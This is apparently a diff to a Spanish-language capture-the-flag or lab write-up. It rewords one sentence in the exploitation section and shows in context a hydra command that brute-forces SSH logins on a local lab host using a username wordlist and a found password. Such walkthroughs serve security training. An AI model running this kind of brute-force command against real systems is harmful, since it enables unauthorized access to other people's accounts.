@@ -104,7 +104,7 @@ Encontramos una página **index.php**, que si la visitamos encontramos lo que pa
 
 ## Explotación.
 
-Con esta contraseña podemos buscar si podmeos entrar por fuerza bruta por el puerto **ssh** (22).
+Con esta contraseña podemos probar a entrar por fuerza bruta por el puerto **ssh** (22).
 ```bash
 hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p JIFGHDS87GYDFIGD ssh://172.17.0.2
 ```
